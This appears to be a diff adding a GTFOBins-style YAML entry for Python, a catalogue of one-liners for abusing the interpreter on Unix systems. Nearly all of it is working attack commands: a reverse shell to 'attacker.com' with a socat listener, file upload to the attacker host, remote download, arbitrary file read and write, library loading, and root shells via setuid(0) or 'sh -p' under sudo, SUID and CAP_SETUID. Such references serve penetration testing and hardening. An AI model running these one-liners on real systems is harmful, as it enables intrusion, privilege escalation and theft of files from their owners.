@@ -1,0 +1,91 @@
+---
+comment: |-
+  The payloads are compatible with both Python version 2 and 3.
+functions:
+  download:
+  - code: |-
+      python -c 'import sys; from os import environ as e
+      if sys.version_info.major == 3: import urllib.request as r
+      else: import urllib as r
+      r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    sender: http-server
+  file-read:
+  - code: |-
+      python -c 'print(open("/path/to/input-file").read())'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      python -c 'open("/path/to/output-file","w+").write("DATA")'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  library-load:
+  - code: |-
+      python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+    contexts:
+      capabilities:
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      python -c 'import sys,socket,os,pty;s=socket.socket()
+      s.connect(("attacker.com",12345))
+      [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+      pty.spawn("/bin/sh")'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    listener:
+      code: |-
+        socat file:/dev/tty,raw,echo=0 tcp-listen:12345
+      comment: |-
+        A TCP server with TTY support can be used on the attacker box to receive the shell.
+  shell:
+  - code: |-
+      python -c 'import os; os.execl("/bin/sh", "sh")'
+    contexts:
+      capabilities:
+        code: |-
+          python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        code: |-
+          python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+        shell: false
+      unprivileged:
+  upload:
+  - code: |-
+      python -c 'import sys
+      if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+      else: import urllib as u, urllib2 as r
+      r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: http-server
+  - code: |-
+      python -c 'import sys
+      if sys.version_info.major == 3: import http.server as s, socketserver as ss
+      else: import SimpleHTTPServer as s, SocketServer as ss
+      ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: http-client
+...
